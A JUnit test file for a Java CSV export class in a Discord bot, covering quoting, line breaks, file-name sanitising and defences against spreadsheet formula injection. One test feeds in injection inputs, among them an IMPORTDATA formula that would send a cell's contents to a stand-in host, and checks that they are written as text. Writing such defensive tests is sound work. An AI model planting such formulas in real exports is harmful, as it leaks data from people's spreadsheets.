package net.hypixel.nerdbot.app.export;

import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class CsvTableTest {

    @Test
    void plainValuesAreWrittenAsTheyAre() {
        CsvTable table = new CsvTable(List.of("A", "B"), ",").addRow(List.of("one", "two"));

        assertEquals("A,B\none,two\n", table.toCsv());
    }

    @Test
    void aValueHoldingTheDelimiterIsQuoted() {
        assertEquals("\"a,b\"", new CsvTable(List.of("A"), ",").field("a,b"));
        assertEquals("a,b", new CsvTable(List.of("A"), ";").field("a,b"));
        assertEquals("\"a;b\"", new CsvTable(List.of("A"), ";").field("a;b"));
    }

    @Test
    void quotesAreDoubledInsideQuotes() {
        assertEquals("\"say \"\"hi\"\"\"", new CsvTable(List.of("A"), ",").field("say \"hi\""));
    }

    @Test
    void lineBreaksAreKeptInsideQuotes() {
        assertEquals("\"one\ntwo\"", new CsvTable(List.of("A"), ",").field("one\ntwo"));
        assertEquals("\"one\r\ntwo\"", new CsvTable(List.of("A"), ",").field("one\r\ntwo"));
    }

    @Test
    void aValueASpreadsheetWouldRunIsWrittenAsText() {
        CsvTable table = new CsvTable(List.of("A"), ";");

        assertEquals("\"'=IMPORTDATA(\"\"https://example.com/?\"\"&A1)\"", table.field("=IMPORTDATA(\"https://example.com/?\"&A1)"));
        assertEquals("'+1+cmd", table.field("+1+cmd"));
        assertEquals("'-2+3", table.field("-2+3"));
        assertEquals("'@SUM(A1)", table.field("@SUM(A1)"));
        assertEquals("'\t=1", table.field("\t=1"));
        assertEquals("\"'\r=1\"", table.field("\r=1"));
        assertEquals("a=b", table.field("a=b"));
    }

    @Test
    void plainNumbersAreLeftAlone() {
        CsvTable table = new CsvTable(List.of("A"), ";");

        assertEquals("-5", table.field("-5"));
        assertEquals("+1.5", table.field("+1.5"));
        assertEquals("-12,5%", table.field("-12,5%"));
    }

    @Test
    void onlyFormulaColumnsKeepTheirFormulas() {
        CsvTable table = new CsvTable(List.of("Name", "Link"), ";").formulaColumns("Link")
            .addRow(List.of("=HYPERLINK(\"https://example.com\", \"me\")", "=HYPERLINK(\"https://discord.com/x\", \"View\")"));

        assertEquals("Name;Link\n"
            + "\"'=HYPERLINK(\"\"https://example.com\"\", \"\"me\"\")\";"
            + "\"=HYPERLINK(\"\"https://discord.com/x\"\", \"\"View\"\")\"\n", table.toCsv());
    }

    @Test
    void aFormulaColumnMustBeAHeader() {
        assertThrows(IllegalArgumentException.class, () -> new CsvTable(List.of("A"), ";").formulaColumns("B"));
    }

    @Test
    void aMissingValueIsEmpty() {
        CsvTable table = new CsvTable(List.of("A", "B"), ",").addRow(Arrays.asList("one", null));

        assertEquals("A,B\none,\n", table.toCsv());
    }

    @Test
    void aRowMustHaveAValuePerHeader() {
        CsvTable table = new CsvTable(List.of("A", "B"), ",");

        assertThrows(IllegalArgumentException.class, () -> table.addRow(List.of("only one")));
        assertTrue(table.isEmpty());
    }

    @Test
    void exportFileNamesKeepOnlySafeCharacters() {
        ExportFile file = ExportFile.of("archive-#general/old: 2", "csv", Instant.parse("2026-10-13T09:30:00Z"), "a,b");

        assertEquals("archive-_general_old__2-2026-10-13_09-30-00.csv", file.name());
        assertArrayEquals("a,b".getBytes(StandardCharsets.UTF_8), file.data());
    }
}
